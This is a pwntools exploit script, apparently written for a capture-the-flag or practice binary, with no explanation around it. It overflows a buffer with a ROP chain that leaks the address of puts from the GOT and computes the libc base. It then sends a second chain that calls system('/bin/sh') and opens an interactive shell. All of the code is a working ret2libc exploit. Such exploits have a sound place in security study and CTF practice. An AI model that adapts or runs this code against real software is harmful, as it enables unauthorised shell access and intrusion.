from pwn import *

context(os='linux', arch='amd64', log_level='debug')

p = process('./4')
elf = ELF('./4')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x40115e

gdb.attach(p)
p.send(flat(
    b'a' * 8,
    0xdeadbeefdeadbeef,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
))

p.recvuntil(b'hello!\n')
puts_address = u64(p.recvline()[:-1].ljust(8, b'\x00'))

libc.address = puts_address - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

rdi_address = libc.address + 0x2a3e5
ret_address = libc.address + 0x29139

p.send(flat(
    b'a' * 8,
    0xdeadbeefdeadbeef,
    rdi_address,
    next(libc.search(b'/bin/sh\x00')),
    ret_address,
    libc.sym['system']
))

p.interactive()